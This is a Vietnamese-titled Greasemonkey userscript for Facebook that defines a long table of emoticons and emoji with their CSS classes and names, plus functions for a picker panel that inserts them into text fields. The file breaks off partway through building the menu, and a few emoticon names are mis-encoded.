// ==UserScript==
// @name            Ve Chibi Truc Tiep Tren Facebook 2014 (y)
// @description     All about facebook By Meo Dep Zdai
// @include         https://*.facebook.com/*
// @include         https://*.facebook.com/*/*
// @include         http://*.facebook.com/*
// @include         http://*.facebook.com/*/*
// ==/UserScript==
// ==13470X==
// ==============
// ==Icon==
(function() {
	// Active only in main frame
	if (!document.querySelector("#pageNav")) {
		return;
	}
	//console.info("Extra Facebook Smileys");

	// = Data =======
	var emoticons = [ { // Text to picture emoticons
"chars" : " :) ",
		"class" : "emoticon_smile",
		"name" : "Smiley"
	}, {
		"chars" : " :( ",
		"class" : "emoticon_frown",
		"name" : "Frown"
	}, {
		"chars" : " :P ",
		"class" : "emoticon_tongue",
		"name" : "Tongue"
	}, {
        "chars" : " :D ",
		"class" : "emoticon_grin",
		"name" : "Grin"
	}, {
		"chars" : " :o ",
		"class" : "emoticon_gasp",
		"name" : "Gasp"
	}, {
		"chars" : " ;) ",
		"class" : "emoticon_wink",
		"name" : "Wink"
	}, {
		"chars" : " :v ",
		"class" : "emoticon_pacman",
		"name" : "Pacman"
	}, {
		"chars" : " >:( ",
		"class" : "emoticon_grumpy",
		"name" : "Gru?ƒÂ±?ƒÂ³n"
	}, {
		"chars" : " :/ ",
		"class" : "emoticon_unsure",
		"name" : "Unsure"
	}, {
		"chars" : " :'( ",
		"class" : "emoticon_cry",
		"name" : "Cry"
	}, {
		"chars" : " ^_^ ",
		"class" : "emoticon_kiki",
		"name" : "Kiki"
	}, {
		"chars" : " 8) ",
		"class" : "emoticon_glasses",
		"name" : "Glasses"
	}, {
		"chars" : " B| ",
		"class" : "emoticon_sunglasses",
		"name" : "Sunglasses"
	}, {
		"chars" : " <3 ",
		"class" : "emoticon_heart",
		"name" : "Heart"
	}, {
		"chars" : " 3:) ",
		"class" : "emoticon_devil",
		"name" : "Devil"
	}, {
		"chars" : " O:) ",
		"class" : "emoticon_angel",
		"name" : "Angel"
	}, {
		"chars" : " -_- ",
		"class" : "emoticon_squint",
		"name" : "Squint"
	}, {
		"chars" : " o.O ",
		"class" : "emoticon_confused",
		"name" : "Confused"
	}, {
		"chars" : " >:o ",
		"class" : "emoticon_upset",
		"name" : "Upset"
	}, {
		"chars" : " :3 ",
		"class" : "emoticon_colonthree",
		"name" : "Colonthree"
	}, {
		"chars" : " (y) ",
		"class" : "emoticon_like",
		"name" : "Like"
	}, {
		"chars" : " :* ",
		"class" : "emoticon emoticon_kiss",
		"name" : "Kiss"
	}, {
		"chars" : " (^^^) ",
		"class" : "emoticon_shark",
		"name" : "Shark"
	}, {
		"chars" : " :|] ",
		"class" : "emoticon_robot",
		"name" : "Robot"
	}, {
		"chars" : " <(\") ",
		"class" : "emoticon_penguin",
		"name" : "Ping?ƒÂ¼ino"
	}, {
		"chars" : " :poop: ",
		"class" : "emoticon_poop",
		"name" : "Poop"
        }, {
		"chars" : " :putnam: ",
		"class" : "emoticon_putnam",
		"name" : "Putman"
	}, {
		"chars" : " \ud83c\udf02 ",
		"class" : "_1az _1a- _2c0",
		"name" : "Pink Umbrella"
	}, {
		"chars" : " \ud83c\udf0a ",
		"class" : "_1az _1a- _2c1",
		"name" : "Sea Wave"
	}, {
		"chars" : " \ud83c\udf19 ",
		"class" : "_1az _1a- _2c2",
		"name" : "Crescent moon"
	}, {
		"chars" : " \ud83c\udf1f ",
		"class" : "_1az _1a- _2c3",
		"name" : "Bright Star"
	}, {
		"chars" : " \ud83c\udf31 ",
		"class" : "_1az _1a- _2c4",
		"name" : "Seedbed"
	}, {
		"chars" : " \ud83c\udf34 ",
		"class" : "_1az _1a- _2c5",
		"name" : "Single Palm Tree"
	}, {
		"chars" : " \ud83c\udf35 ",
		"class" : "_1az _1a- _2c6",
		"name" : "Cactus"
	}, {
		"chars" : " \ud83c\udf37 ",
		"class" : "_1az _1a- _2c7",
		"name" : "Tulip"
	}, {
		"chars" : " \ud83c\udf38 ",
		"class" : "_1az _1a- _2c8",
		"name" : "Cherry Blossom"
	}, {
		"chars" : " \ud83c\udf39 ",
		"class" : "_1az _1a- _2c9",
		"name" : "Rose"
	}, {
		"chars" : " \ud83c\udf3a ",
		"class" : "_1az _1a- _2ca",
		"name" : "Cayenne"
	}, {
		"chars" : " \ud83c\udf3b ",
		"class" : "_1az _1a- _2cb",
		"name" : "Sunflower"
	}, {
		"chars" : " \ud83c\udf3e ",
		"class" : "_1az _1a- _2cc",
		"name" : "Ear Of Rice"
	}, {
		"chars" : " \ud83c\udf40 ",
		"class" : "_1az _1a- _2cd",
		"name" : "Four Leaf Clover"
	}, {
		"chars" : " \ud83c\udf41 ",
		"class" : "_1az _1a- _2ce",
		"name" : "Maple Leaf"
	}, {
		"chars" : " \ud83c\udf42 ",
		"class" : "_1az _1a- _2cf",
		"name" : "Fallen Leaf"
	}, {
		"chars" : " \ud83c\udf43 ",
		"class" : "_1az _1a- _2cg",
		"name" : "Leaf Floating In The Wind"
	}, {
		"chars" : " \ud83c\udf4a ",
		"class" : "_1az _1a- _2ch",
		"name" : "Tangerine"
	}, {
		"chars" : " \ud83c\udf4e ",
		"class" : "_1az _1a- _2ci",
		"name" : "Red Apple"
	}, {
		"chars" : " \ud83c\udf53 ",
		"class" : "_1az _1a- _2cj",
		"name" : "Strawberry"
	}, {
		"chars" : " \ud83c\udf54 ",
		"class" : "_1az _1a- _2ck",
		"name" : "Burger"
	}, {
		"chars" : " \ud83c\udf78 ",
		"class" : "_1az _1a- _2cl",
		"name" : "Cocktail Glass"
	}, {
		"chars" : " \ud83c\udf7a ",
		"class" : "_1az _1a- _2cm",
		"name" : "Tankard"
	}, {
		"chars" : " \ud83c\udf81 ",
		"class" : "_1az _1a- _2cn",
		"name" : "Gift Wrapped"
	}, {
		"chars" : " \ud83c\udf83 ",
		"class" : "_1az _1a- _2co",
		"name" : "Pumpkin With Candle"
	}, {
		"chars" : " \ud83c\udf84 ",
		"class" : "_1az _1a- _2cp",
		"name" : "Christmas Tree"
	}, {
		"chars" : " \ud83c\udf85 ",
		"class" : "_1az _1a- _2cq",
		"name" : "Santa"
	}, {
		"chars" : " \ud83c\udf88 ",
		"class" : "_1az _1a- _2cr",
		"name" : "Balloon"
	}, {
		"chars" : " \ud83c\udf89 ",
		"class" : "_1az _1a- _2cs",
		"name" : "Party Popper"
	}, {
		"chars" : " \ud83c\udf8d ",
		"class" : "_1az _1a- _2ct",
		"name" : "Pine Decor"
	}, {
		"chars" : " \ud83c\udf8e ",
		"class" : "_1az _1a- _2cu",
		"name" : "Japanese Dolls"
	}, {
		"chars" : " \ud83c\udf8f ",
		"class" : "_1az _1a- _2cv",
		"name" : "Carp Streamer"
	}, {
		"chars" : " \ud83c\udf90 ",
		"class" : "_1az _1a- _2cw",
		"name" : "Wind Chime"
	}, {
		"chars" : " \ud83c\udf93 ",
		"class" : "_1az _1a- _2cx",
		"name" : "Graduation Cap"
	}, {
		"chars" : " \ud83c\udfb5 ",
		"class" : "_1az _1a- _2cy",
		"name" : "Musical Note"
	}, {
		"chars" : " \ud83c\udfb6 ",
		"class" : "_1az _1a- _2cz",
		"name" : "Multiple Musical Notes"
	}, {
		"chars" : " \ud83c\udfbc ",
		"class" : "_1az _1a- _2c-",
		"name" : "Musical Score"
	}, {
		"chars" : " \ud83d\udc0d ",
		"class" : "_1az _1a- _2c_",
		"name" : "Snake"
	}, {
		"chars" : " \ud83d\udc0e ",
		"class" : "_1az _1a- _2d0",
		"name" : "Horse"
	}, {
		"chars" : " \ud83d\udc11 ",
		"class" : "_1az _1a- _2d1",
		"name" : "Sheep"
	}, {
		"chars" : " \ud83d\udc12 ",
		"class" : "_1az _1a- _2d2",
		"name" : "Monkey"
	}, {
		"chars" : " \ud83d\udc14 ",
		"class" : "_1az _1a- _2d3",
		"name" : "Hen"
	}, {
		"chars" : " \ud83d\udc17 ",
		"class" : "_1az _1a- _2d4",
		"name" : "Wild Boar"
	}, {
		"chars" : " \ud83d\udc18 ",
		"class" : "_1az _1a- _2d5",
		"name" : "Elephant"
	}, {
		"chars" : " \ud83d\udc19 ",
		"class" : "_1az _1a- _2d6",
		"name" : "Octopus"
	}, {
		"chars" : " \ud83d\udc1a ",
		"class" : "_1az _1a- _2d7",
		"name" : "Snail Shell"
	}, {
		"chars" : " \ud83d\udc1b ",
		"class" : "_1az _1a- _2d8",
		"name" : "Insect"
	}, {
		"chars" : " \ud83d\udc1f ",
		"class" : "_1az _1a- _2d9",
		"name" : "Fish"
	}, {
		"chars" : " \ud83d\udc20 ",
		"class" : "_1az _1a- _2da",
		"name" : "Tropical Fish"
	}, {
		"chars" : " \ud83d\udc21 ",
		"class" : "_1az _1a- _2db",
		"name" : "Pufferfish"
	}, {
		"chars" : " \ud83d\udc25 ",
		"class" : "_1az _1a- _2dc",
		"name" : "Chick In Front"
	}, {
		"chars" : " \ud83d\udc26 ",
		"class" : "_1az _1a- _2dd",
		"name" : "Bird"
	}, {
		"chars" : " \ud83d\udc27 ",
		"class" : "_1az _1a- _2de",
		"name" : "Penguin"
	}, {
		"chars" : " \ud83d\udc28 ",
		"class" : "_1az _1a- _2df",
		"name" : "Koala"
	}, {
		"chars" : " \ud83d\udc29 ",
		"class" : "_1az _1a- _2dg",
		"name" : "Poodle"
	}, {
		"chars" : " \ud83d\udc2b ",
		"class" : "_1az _1a- _2dh",
		"name" : "Bactrian Camel"
	}, {
		"chars" : " \ud83d\udc2c ",
		"class" : "_1az _1a- _2di",
		"name" : "Dolphin"
	}, {
		"chars" : " \ud83d\udc2d ",
		"class" : "_1az _1a- _2dj",
		"name" : "Mouse Face"
	}, {
		"chars" : " \ud83d\udc2e ",
		"class" : "_1az _1a- _2dk",
		"name" : "Cow Face"
	}, {
		"chars" : " \ud83d\udc2f ",
		"class" : "_1az _1a- _2dl",
		"name" : "Cara de tigre"
	}, {
		"chars" : " \ud83d\udc30 ",
		"class" : "_1az _1a- _2dm",
		"name" : "Rabbit Face"
	}, {
		"chars" : " \ud83d\udc31 ",
		"class" : "_1az _1a- _2dn",
		"name" : "Cat Face"
	}, {
		"chars" : " \ud83d\udc33 ",
		"class" : "_1az _1a- _2do",
		"name" : "Whale Sputtering"
	}, {
		"chars" : " \ud83d\udc34 ",
		"class" : "_1az _1a- _2dp",
		"name" : "Horse Face"
	}, {
		"chars" : " \ud83d\udc35 ",
		"class" : "_1az _1a- _2dq",
		"name" : "Monkey Face"
	}, {
		"chars" : " \ud83d\udc37 ",
		"class" : "_1az _1a- _2dr",
		"name" : "Pig face"
	}, {
		"chars" : " \ud83d\udc38 ",
		"class" : "_1az _1a- _2ds",
		"name" : "Frog Face"
	}, {
		"chars" : " \ud83d\udc39 ",
		"class" : "_1az _1a- _2dt",
		"name" : "Hamster Face"
	}, {
		"chars" : " \ud83d\udc3a ",
		"class" : "_1az _1a- _2du",
		"name" : "Wolf Face"
	}, {
		"chars" : " \ud83d\udc3b ",
		"class" : "_1az _1a- _2dv",
		"name" : "Bear Face"
	}, {
		"chars" : " \ud83d\udc3e ",
		"class" : "_1az _1a- _2dw",
		"name" : "Footprints"
	}, {
		"chars" : " \ud83d\udc40 ",
		"class" : "_1az _1a- _2dx",
		"name" : "Eyes"
	}, {
		"chars" : " \ud83d\udc42 ",
		"class" : "_1az _1a- _2dy",
		"name" : "Ear"
	}, {
		"chars" : " \ud83d\udc43 ",
		"class" : "_1az _1a- _2dz",
		"name" : "Nose"
	}, {
		"chars" : " \ud83d\udc44 ",
		"class" : "_1az _1a- _2d-",
		"name" : "Mouth"
	}, {
		"chars" : " \ud83d\udc45 ",
		"class" : "_1az _1a- _2d_",
		"name" : "Sour Face"
	}, {
		"chars" : " \ud83d\udc46 ",
		"class" : "_1az _1a- _2e0",
		"name" : "White hand pointing up"
	}, {
		"chars" : " \ud83d\udc47 ",
		"class" : "_1az _1a- _2e1",
		"name" : "White hand faces downward"
	}, {
		"chars" : " \ud83d\udc48 ",
		"class" : "_1az _1a- _2e2",
		"name" : "White hand indicating left"
	}, {
		"chars" : " \ud83d\udc49 ",
		"class" : "_1az _1a- _2e3",
		"name" : "White hand indicating right"
	}, {
		"chars" : " \ud83d\udc4a ",
		"class" : "_1az _1a- _2e4",
		"name" : "Fist"
	}, {
		"chars" : " \ud83d\udc4b ",
		"class" : "_1az _1a- _2e5",
		"name" : "Hand in motion"
	}, {
		"chars" : " \ud83d\udc4c ",
		"class" : "_1az _1a- _2e6",
		"name" : "Hand showing all good"
	}, {
		"chars" : " \ud83d\udc4d ",
		"class" : "_1az _1a- _2e7",
		"name" : "Hand with thumb up"
	}, {
		"chars" : " \ud83d\udc4e ",
		"class" : "_1az _1a- _2e8",
		"name" : "Hand with thumb down"
	}, {
		"chars" : " \ud83d\udc4f ",
		"class" : "_1az _1a- _2e9",
		"name" : "Hands clapping"
	}, {
		"chars" : " \ud83d\udc50 ",
		"class" : "_1az _1a- _2ea",
		"name" : "Open Hands"
	}, {
		"chars" : " \ud83d\udc66 ",
		"class" : "_1az _1a- _2eb",
		"name" : "Boy"
	}, {
		"chars" : " \ud83d\udc67 ",
		"class" : "_1az _1a- _2ec",
		"name" : "Girl"
	}, {
		"chars" : " \ud83d\udc68 ",
		"class" : "_1az _1a- _2ed",
		"name" : "Man"
	}, {
		"chars" : " \ud83d\udc69 ",
		"class" : "_1az _1a- _2ee",
		"name" : "Woman"
	}, {
		"chars" : " \ud83d\udc6b ",
		"class" : "_1az _1a- _2ef",
		"name" : "Man and woman holding hands"
	}, {
		"chars" : " \ud83d\udc6e ",
		"class" : "_1az _1a- _2eg",
		"name" : "Police Officer"
	}, {
		"chars" : " \ud83d\udc6f ",
		"class" : "_1az _1a- _2eh",
		"name" : "Woman with bunny ears"
	}, {
		"chars" : " \ud83d\udc71 ",
		"class" : "_1az _1a- _2ei",
		"name" : "Person with hair rubio"
	}, {
		"chars" : " \ud83d\udc72 ",
		"class" : "_1az _1a- _2ej",
		"name" : "Man with pi mao gua"
	}, {
		"chars" : " \ud83d\udc73 ",
		"class" : "_1az _1a- _2ek",
		"name" : "Man with turban"
	}, {
		"chars" : " \ud83d\udc74 ",
		"class" : "_1az _1a- _2el",
		"name" : "Old Man"
	}, {
		"chars" : " \ud83d\udc75 ",
		"class" : "_1az _1a- _2em",
		"name" : "Old Woman"
	}, {
		"chars" : " \ud83d\udc76 ",
		"class" : "_1az _1a- _2en",
		"name" : "Baby"
	}, {
		"chars" : " \ud83d\udc77 ",
		"class" : "_1az _1a- _2eo",
		"name" : "Construction Worker"
	}, {
		"chars" : " \ud83d\udc78 ",
		"class" : "_1az _1a- _2ep",
		"name" : "Princess"
	}, {
		"chars" : " \ud83d\udc7b ",
		"class" : "_1az _1a- _2eq",
		"name" : "Ghost"
	}, {
		"chars" : " \ud83d\udc7c ",
		"class" : "_1az _1a- _2er",
		"name" : "Angel baby"
	}, {
		"chars" : " \ud83d\udc7d ",
		"class" : "_1az _1a- _2es",
		"name" : "Alien"
	}, {
		"chars" : " \ud83d\udc7e ",
		"class" : "_1az _1a- _2et",
		"name" : "Alien Monster"
	}, {
		"chars" : " \ud83d\udc7f ",
		"class" : "_1az _1a- _2eu",
		"name" : "Imp"
	}, {
		"chars" : " \ud83d\udc80 ",
		"class" : "_1az _1a- _2ev",
		"name" : "Skull"
	}, {
		"chars" : " \ud83d\udc82 ",
		"class" : "_1az _1a- _2ew",
		"name" : "Guard"
	}, {
		"chars" : " \ud83d\udc83 ",
		"class" : "_1az _1a- _2ex",
		"name" : "Ballerina"
	}, {
		"chars" : " \ud83d\udc85 ",
		"class" : "_1az _1a- _2ey",
		"name" : "Nail Polish"
	}, {
		"chars" : " \ud83d\udc8b ",
		"class" : "_1az _1a- _2ez",
		"name" : "Brand of kiss"
	}, {
		"chars" : " \ud83d\udc8f ",
		"class" : "_1az _1a- _2e-",
		"name" : "Kissing couple"
	}, {
		"chars" : " \ud83d\udc90 ",
		"class" : "_1az _1a- _2e_",
		"name" : "Bunch of flowers"
	}, {
		"chars" : " \ud83d\udc91 ",
		"class" : "_1az _1a- _2f0",
		"name" : "Couple with heart"
	}, {
		"chars" : " \ud83d\udc93 ",
		"class" : "_1az _1a- _2f1",
		"name" : "Heart beating"
	}, {
		"chars" : " \ud83d\udc94 ",
		"class" : "_1az _1a- _2f2",
		"name" : "Broken Heart"
	}, {
		"chars" : " \ud83d\udc96 ",
		"class" : "_1az _1a- _2f3",
		"name" : "Bright Heart"
	}, {
		"chars" : " \ud83d\udc97 ",
		"class" : "_1az _1a- _2f4",
		"name" : "Heart growing"
	}, {
		"chars" : " \ud83d\udc98 ",
		"class" : "_1az _1a- _2f5",
		"name" : "Heart with arrow"
	}, {
		"chars" : " \ud83d\udc99 ",
		"class" : "_1az _1a- _2f6",
		"name" : "Blue Heart"
	}, {
		"chars" : " \ud83d\udc9a ",
		"class" : "_1az _1a- _2f7",
		"name" : "Green Heart"
	}, {
		"chars" : " \ud83d\udc9b ",
		"class" : "_1az _1a- _2f8",
		"name" : "Yellow Heart"
	}, {
		"chars" : " \ud83d\udc9c ",
		"class" : "_1az _1a- _2f9",
		"name" : "Purple Heart"
	}, {
		"chars" : " \ud83d\udc9d ",
		"class" : "_1az _1a- _2fa",
		"name" : "Heart with ribbon"
	}, {
		"chars" : " \ud83d\udca2 ",
		"class" : "_1az _1a- _2fb",
		"name" : "Symbol of anger"
	}, {
		"chars" : " \ud83d\udca4 ",
		"class" : "_1az _1a- _2fc",
		"name" : "Sleeping"
	}, {
		"chars" : " \ud83d\udca6 ",
		"class" : "_1az _1a- _2fd",
		"name" : "Sweat Symbol"
	}, {
		"chars" : " \ud83d\udca8 ",
		"class" : "_1az _1a- _2fe",
		"name" : "Quick Start Symbol"
	}, {
		"chars" : " \ud83d\udca9 ",
		"class" : "_1az _1a- _2ff",
		"name" : "Pile of Caca"
	}, {
		"chars" : " \ud83d\udcaa ",
		"class" : "_1az _1a- _2fg",
		"name" : "Flexed bicep"
	}, {
		"chars" : " \ud83d\udcbb ",
		"class" : "_1az _1a- _2fh",
		"name" : "Personal Computer"
	}, {
		"chars" : " \ud83d\udcbd ",
		"class" : "_1az _1a- _2fi",
		"name" : "Mini Disco"
	}, {
		"chars" : " \ud83d\udcbe ",
		"class" : "_1az _1a- _2fj",
		"name" : "Floppy disk"
	}, {
		"chars" : " \ud83d\udcbf ",
		"class" : "_1az _1a- _2fk",
		"name" : "Optical Disc"
	}, {
		"chars" : " \ud83d\udcc0 ",
		"class" : "_1az _1a- _2fl",
		"name" : "DVD"
	}, {
		"chars" : " \ud83d\udcde ",
		"class" : "_1az _1a- _2fm",
		"name" : "Telephone receiver"
	}, {
		"chars" : " \ud83d\udce0 ",
		"class" : "_1az _1a- _2fn",
		"name" : "Fax"
	}, {
		"chars" : " \ud83d\udcf1 ",
		"class" : "_1az _1a- _2fo",
		"name" : "Mobile Phone"
	}, {
		"chars" : " \ud83d\udcf2 ",
		"class" : "_1az _1a- _2fp",
		"name" : "Mobile phone with arrow from left to right"
	}, {
		"chars" : " \ud83d\udcfa ",
		"class" : "_1az _1a- _2fq",
		"name" : "Television"
	}, {
		"chars" : " \ud83d\udd14 ",
		"class" : "_1az _1a- _2fr",
		"name" : "Bell"
	}, {
		"chars" : " \ud83d\ude01 ",
		"class" : "_1az _1a- _2fs",
		"name" : "Face to face with smiling eyes"
	}, {
		"chars" : " \ud83d\ude02 ",
		"class" : "_1az _1a- _2ft",
		"name" : "Face with tears of joy"
	}, {
		"chars" : " \ud83d\ude03 ",
		"class" : "_1az _1a- _2fu",
		"name" : "Smiley face with open mouth"
	}, {
		"chars" : " \ud83d\ude04 ",
		"class" : "_1az _1a- _2fv",
		"name" : "Face and eyes smiling with mouth open"
	}, {
		"chars" : " \ud83d\ude06 ",
		"class" : "_1az _1a- _2fw",
		"name" : "Smiley face with mouth open and eyes closed"
	}, {
		"chars" : " \ud83d\ude09 ",
		"class" : "_1az _1a- _2fx",
		"name" : "Face winking eye"
	}, {
		"chars" : " \ud83d\ude0b ",
		"class" : "_1az _1a- _2fy",
		"name" : "Guy savoring delicious food"
	}, {
		"chars" : " \ud83d\ude0c ",
		"class" : "_1az _1a- _2fz",
		"name" : "Relief face"
	}, {
		"chars" : " \ud83d\ude0d ",
		"class" : "_1az _1a- _2f-",
		"name" : "Smiley face with heart shaped eyes"
	}, {
		"chars" : " \ud83d\ude0f ",
		"class" : "_1az _1a- _2f_",
		"name" : "Smirk face"
	}, {
		"chars" : " \ud83d\ude12 ",
		"class" : "_1az _1a- _2g0",
		"name" : "Face of boredom"
	}, {
		"chars" : " \ud83d\ude13 ",
		"class" : "_1az _1a- _2g1",
		"name" : "Face with cold sweat"
	}, {
		"chars" : " \ud83d\ude14 ",
		"class" : "_1az _1a- _2g2",
		"name" : "Pensive face"
	}, {
		"chars" : " \ud83d\ude16 ",
		"class" : "_1az _1a- _2g3",
		"name" : "Confused face"
	}, {
		"chars" : " \ud83d\ude18 ",
		"class" : "_1az _1a- _2g4",
		"name" : "Throwing kiss Face"
	}, {
		"chars" : " \ud83d\ude1a ",
		"class" : "_1az _1a- _2g5",
		"name" : "Kissing face with eyes closed"
	}, {
		"chars" : " \ud83d\ude1c ",
		"class" : "_1az _1a- _2g6",
		"name" : "Face with tongue out and winking"
	}, {
		"chars" : " \ud83d\ude1d ",
		"class" : "_1az _1a- _2g7",
		"name" : "Face with tongue hanging out and eyes closed"
	}, {
		"chars" : " \ud83d\ude1e ",
		"class" : "_1az _1a- _2g8",
		"name" : "Face discouraged"
	}, {
		"chars" : " \ud83d\ude20 ",
		"class" : "_1az _1a- _2g9",
		"name" : "Face of anger"
	}, {
		"chars" : " \ud83d\ude21 ",
		"class" : "_1az _1a- _2ga",
		"name" : "Very angry face"
	}, {
		"chars" : " \ud83d\ude22 ",
		"class" : "_1az _1a- _2gb",
		"name" : "Crying Face"
	}, {
		"chars" : " \ud83d\ude23 ",
		"class" : "_1az _1a- _2gc",
		"name" : "Face of perseverance"
	}, {
		"chars" : " \ud83d\ude24 ",
		"class" : "_1az _1a- _2gd",
		"name" : "Face of triumph"
	}, {
		"chars" : " \ud83d\ude25 ",
		"class" : "_1az _1a- _2ge",
		"name" : "Face discouraged but relieved"
	}, {
		"chars" : " \ud83d\ude28 ",
		"class" : "_1az _1a- _2gf",
		"name" : "Scary face"
	}, {
		"chars" : " \ud83d\ude29 ",
		"class" : "_1az _1a- _2gg",
		"name" : "Fatigued face"
	}, {
		"chars" : " \ud83d\ude2a ",
		"class" : "_1az _1a- _2gh",
		"name" : "Sleeping face"
	}, {
		"chars" : " \ud83d\ude2b ",
		"class" : "_1az _1a- _2gi",
		"name" : "Tired face"
	}, {
		"chars" : " \ud83d\ude2d ",
		"class" : "_1az _1a- _2gj",
		"name" : "Face screaming"
	}, {
		"chars" : " \ud83d\ude30 ",
		"class" : "_1az _1a- _2gk",
		"name" : "Face with mouth open and cold sweat"
	}, {
		"chars" : " \ud83d\ude31 ",
		"class" : "_1az _1a- _2gl",
		"name" : "Terrified face of fear"
	}, {
		"chars" : " \ud83d\ude32 ",
		"class" : "_1az _1a- _2gm",
		"name" : "Very surprised face"
	}, {
		"chars" : " \ud83d\ude33 ",
		"class" : "_1az _1a- _2gn",
		"name" : "Face flushed"
	}, {
		"chars" : " \ud83d\ude35 ",
		"class" : "_1az _1a- _2go",
		"name" : "Face dizzy"
	}, {
		"chars" : " \ud83d\ude37 ",
		"class" : "_1az _1a- _2gp",
		"name" : "Face with medical mask"
	}, {
		"chars" : " \ud83d\ude38 ",
		"class" : "_1az _1a- _2gq",
		"name" : "Grinning Cat face and eyes closed"
	}, {
		"chars" : " \ud83d\ude39 ",
		"class" : "_1az _1a- _2gr",
		"name" : "Cat face with tears of laughter"
	}, {
		"chars" : " \ud83d\ude3a ",
		"class" : "_1az _1a- _2gs",
		"name" : "Smiling cat face with open mouth"
	}, {
		"chars" : " \ud83d\ude3b ",
		"class" : "_1az _1a- _2gt",
		"name" : "Smiling cat face with hearts in her eyes"
	}, {
		"chars" : " \ud83d\ude3c ",
		"class" : "_1az _1a- _2gu",
		"name" : "Face of cat smile twisted"
	}, {
		"chars" : " \ud83d\ude3d ",
		"class" : "_1az _1a- _2gv",
		"name" : "Cat face kissing with eyes closed"
	}, {
		"chars" : " \ud83d\ude3f ",
		"class" : "_1az _1a- _2gw",
		"name" : "Cat face crying"
	}, {
		"chars" : " \ud83d\ude40 ",
		"class" : "_1az _1a- _2gx",
		"name" : "Cat face scared terrified"
	}, {
		"chars" : " \ud83d\ude4b ",
		"class" : "_1az _1a- _2gy",
		"name" : "Happy person raising a hand"
	}, {
		"chars" : " \ud83d\ude4c ",
		"class" : "_1az _1a- _2gz",
		"name" : "Person holding up both hands in celebration"
	}, {
		"chars" : " \ud83d\ude4d ",
		"class" : "_1az _1a- _2g-",
		"name" : "Person frowning"
	}, {
		"chars" : " \ud83d\ude4f ",
		"class" : "_1az _1a- _2g_",
		"name" : "Person in prayer"
	}, {
		"chars" : " \u261d ",
		"class" : "_1az _1a- _2h0",
		"name" : "Index finger pointing up"
	}, {
		"chars" : " \u263a ",
		"class" : "_1az _1a- _2h1",
		"name" : "White face smiling"
	}, {
		"chars" : " \u26a1 ",
		"class" : "_1az _1a- _2h2",
		"name" : "High voltage symbol"
	}, {
		"chars" : " \u26c4 ",
		"class" : "_1az _1a- _2h3",
		"name" : "Snowless snowman"
	}, {
		"chars" : " \u270a ",
		"class" : "_1az _1a- _2h4",
		"name" : "Fist up"
	}, {
		"chars" : " \u270b ",
		"class" : "_1az _1a- _2h5",
		"name" : "Hand pointing up"
	}, {
		"chars" : " \u270c ",
		"class" : "_1az _1a- _2h6",
		"name" : "Winning Hand"
	}, {
		"chars" : " \u2600 ",
		"class" : "_1az _1a- _2h7",
		"name" : "Sun With Rays"
	}, {
		"chars" : " \u2601 ",
		"class" : "_1az _1a- _2h8",
		"name" : "Cloud"
	}, {
		"chars" : " \u2614 ",
		"class" : "_1az _1a- _2h9",
		"name" : "Umbrella With Rain Drops"
	}, {
		"chars" : " \u2615 ",
		"class" : "_1az _1a- _2ha",
		"name" : "Hot Drink"
	}, {
		"chars" : " \u2728 ",
		"class" : "_1az _1a- _2hb",
		"name" : "Brightness"
	}, {
		"chars" : " \u2764 ",
		"class" : "_1az _1a- _2hc",
		"name" : "Heavy Black Heart"
	} ];

	// = Variables =======
	var lastActiveElement = document.activeElement;

	// = Functions =======
	function createElement(html) {
		var outerHTML = document.createElement("div");
		outerHTML.innerHTML = html;
		return outerHTML.firstChild;
	}

	function htmlSpecialChars(string) {
		var div = document.createElement("div");
		var text = document.createTextNode(string);
		div.appendChild(text);
		return div.innerHTML;
	}

	function isInstanceOfTextInput(element) {
		return (element instanceof HTMLInputElement && element.type == "text")
				|| element instanceof HTMLTextAreaElement;
	}

	function isFlyoutOpen(flyout) {
		return flyout.className == "openToggler";
	}

	function openFlyout(flyout, open) {
		if (open === undefined) {
			open = !isFlyoutOpen(flyout); // Toggle
		}

		if (open) {
			flyout.className = "openToggler";
		} else {
			flyout.removeAttribute("class");
		}
	}

	function createTab(titleContainer, bodyContainer) {
		var html;
		// Tab; default = inactive
	    html = '<li class="jewelFlyout fbJewelFlyout uiToggleFlyout">';
		html += '<div class="jewelFlyout">';
		html += '</div>';
		html += '</li>';
		var title = createElement(html);
		titleContainer.appendChild(title);

		// Manual input
		html = '<div style="display: none;">';
		html += '</div>';
		var body = createElement(html);
		bodyContainer.appendChild(body);

		// Change tab listener
		(function(body) {
			title.addEventListener("click", function() {
				// Change tab
				var titles = this.parentNode.childNodes; // tab.tabContainer.childNodes
				for ( var t = 0; t < titles.length; t++) {
					if (titles[t] === this) { // Active
						
					} else { // Inactive
						titles[t].style.background = "";
						titles[t].firstChild.style.color = "";
					}
				}

				// Change body
				var bodies = body.parentNode.childNodes; // body.bodyContainer.childNodes
				for ( var b = 0; b < bodies.length; b++) {
					if (bodies[b] === body) { // Show
						body.style.display = "";
					} else { // Hide
						bodies[b].style.display = "none";
					}
				}
			});
		})(body);

		return {
			"title" : title.firstChild,
			"body" : body
		};
	}

	function createTabListBody(emoticons, filter) {
		var html;

		html = '<div style="max-height: 200px; padding-right: 15px; overflow-x: hidden; line-height: 1em;">';
		html += '<div style="padding: 10px; width: 200px; font-size: 15px;">';
		html += '</div>';
		html += '</div>';
		var body = createElement(html).firstChild;
		for ( var e = 0; e < emoticons.length; e++) {
			var emoticon = emoticons[e];
			if (!filter(emoticon)) {
				continue;
			}

			// Icons
			html = '<span class="panelCell" style="display: inline-block; vertical-align: middle; padding: 2px;">';
			html += '<a';
			html += ' class="emoticon'
					+ (emoticon.class !== undefined ? ' ' + emoticon.class : '')
					+ '"';
			html += ' style="text-decoration: inherit; color: inherit;'
					+ (emoticon.class !== undefined ? ' color: transparent;'
							: ' width: auto;') + '"';
			html += (emoticon.name !== undefined ? ' title="' + emoticon.name
					+ '"' : '');
			html += '>';
			html += htmlSpecialChars(emoticon.chars);
			html += '</a>';
			html += '</span>';
			var cell = createElement(html);
			body.appendChild(cell);

			// Select emoticon listener
			var emoticonA = cell.firstChild;
			(function(emoticon) {
				emoticonA.addEventListener("click", function() {
					if (isInstanceOfTextInput(lastActiveElement)) {
						lastActiveElement.focus();

						var chars = emoticon.chars;
						var value = lastActiveElement.value;
						var start = lastActiveElement.selectionStart;
						var end = lastActiveElement.selectionEnd;
						lastActiveElement.value = value.substring(0, start)
								+ chars + value.substring(end);
						lastActiveElement.setSelectionRange(start + chars.length, start + chars.length);
					}

					openFlyoutCommand = false; // Close flyout
				});
			})(emoticon);
		}

		return body.parentNode;
	}

	// = Construct UI =======
	var html;

	// Menu item
	// var navItem
	html = '<li class="navItem middleItem notifNegativeBase">';
	html += '<div class="fbJewel">';
	// {

	// Toggler
